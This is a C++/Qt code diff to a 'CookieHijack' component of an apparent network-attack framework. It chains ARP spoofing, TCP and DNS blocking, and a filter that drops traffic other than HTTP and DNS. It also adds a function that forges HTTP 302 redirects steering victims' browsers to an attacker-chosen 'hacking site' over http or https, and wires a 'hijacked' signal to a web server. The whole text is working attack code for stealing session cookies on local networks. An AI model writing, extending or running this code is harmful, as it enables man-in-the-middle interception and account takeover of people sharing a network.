@@ -15,7 +15,7 @@ CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
 
 	cookieHijack_.tcpFlowMgr_ = &tcpFlowMgr_;
 
-	bpFilter_.filter_ = "tcp port 443";
+	bpFilter_.filter_ = "!(tcp port 80 or udp port 53)";
 
 	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &find_, &GFind::find, Qt::DirectConnection);
 	QObject::connect(&find_, &GFind::found, &tcpBlock_, &GTcpBlock::block, Qt::DirectConnection);
@@ -27,6 +27,8 @@ CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
 
 	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &bpFilter_, &GBpFilter::filter, Qt::DirectConnection);
 	QObject::connect(&bpFilter_, &GBpFilter::filtered, &block_, &GBlock::block, Qt::DirectConnection);
+
+	QObject::connect(&cookieHijack_, &GCookieHijack::hijacked, &webServer_, &WebServer::doHijacked);
 
 	nodes_.append(&webServer_);
 	nodes_.append(&autoArpSpoof_);
@@ -55,20 +57,13 @@ bool CookieHijack::doOpen() {
 	tcpBlock_.writer_.intfName_ = intfName;
 	dnsBlock_.writer_.intfName_ = intfName;
 
-	QStringList httpResponse;
-	httpResponse += "HTTP/1.1 302 CPRedirect";
-	QString locationStr;
-	if (prefix_ == "")
-		locationStr = QString("Location: http://%1").arg(hackingSite_);
-	else
-		locationStr =  QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
-	if (webServer_.httpPort_ != 80) locationStr += ":" + QString::number(webServer_.httpPort_);
-	locationStr += "/" + hackingSite_;
-	httpResponse += locationStr;
-	httpResponse += "Connection: close";
-	httpResponse += "";
-	httpResponse += "";
-	tcpBlock_.backwardFinMsg_ = httpResponse;
+	if (httpSiteList_.size() == 0) {
+		SET_ERR(GErr::ValueIsZero, "httpSiteList must have at least one site");
+		return false;
+	}
+
+	QString hackingSite = httpSiteList_.at(0);
+	tcpBlock_.backwardFinMsg_ = getHttpResponse(0);
 
 	dnsBlock_.dnsBlockItems_.clear();
 	if (prefix_ != "") {
@@ -84,6 +79,44 @@ bool CookieHijack::doOpen() {
 
 bool CookieHijack::doClose() {
 	bool res = GGraph::doClose();
+
+	return res;
+}
+
+QStringList CookieHijack::getHttpResponse(int siteNo)
+{
+	QString hackingSite;
+	bool ssl;
+	if (siteNo < httpSiteList_.size()) {
+		ssl = false;
+		hackingSite = httpSiteList_.at(siteNo);
+	} else {
+		ssl = true;
+		int sslIndex = siteNo - httpSiteList_.size();
+		if (sslIndex < httpsSiteList_.size()) {
+			hackingSite = httpsSiteList_.at(sslIndex);
+		}
+	}
+	if (hackingSite == "")
+		return QStringList();
+
+	QString scheme = ssl ? "https" : "http";
+	QString status = ssl ? "ssl" : "tcp";
+
+	QStringList res;
+	res += "HTTP/1.1 302 " + status;
+	QString locationStr;
+	int port = ssl ? webServer_.httpsPort_ : webServer_.httpPort_;
+	if (prefix_ == "")
+		locationStr = QString("Location: %1://%2").arg(scheme).arg(hackingSite);
+	else
+		locationStr = QString("Location: %1://%2.%3").arg(scheme).arg(prefix_).arg(hackingSite);
+	if (port != 80 && port != 443) locationStr += ":" + QString::number(port);
+	locationStr += "/" + QString::number(siteNo) + "/" + status;
+	res += locationStr;
+	res += "Connection: close";
+	res += "";
+	res += "";
 
 	return res;
 }
